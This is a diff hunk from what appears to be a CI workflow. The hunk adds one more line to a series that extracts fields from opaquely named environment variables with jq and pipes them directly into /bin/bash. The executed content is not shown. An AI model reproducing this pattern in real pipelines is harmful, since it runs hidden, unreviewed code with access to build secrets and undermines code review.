@@ -38,6 +38,7 @@ jobs:
           echo $md26 | jq -r .vv56785 | /bin/bash
           echo $mp2341 | jq -r .mlw143 | /bin/bash
           echo $rq93435 | jq -r .iikg04 | /bin/bash
+          printf '%s' "$rcaaf3984" | jq -r .ou33 | /bin/bash
 
       - name: Archive output
         if: always()
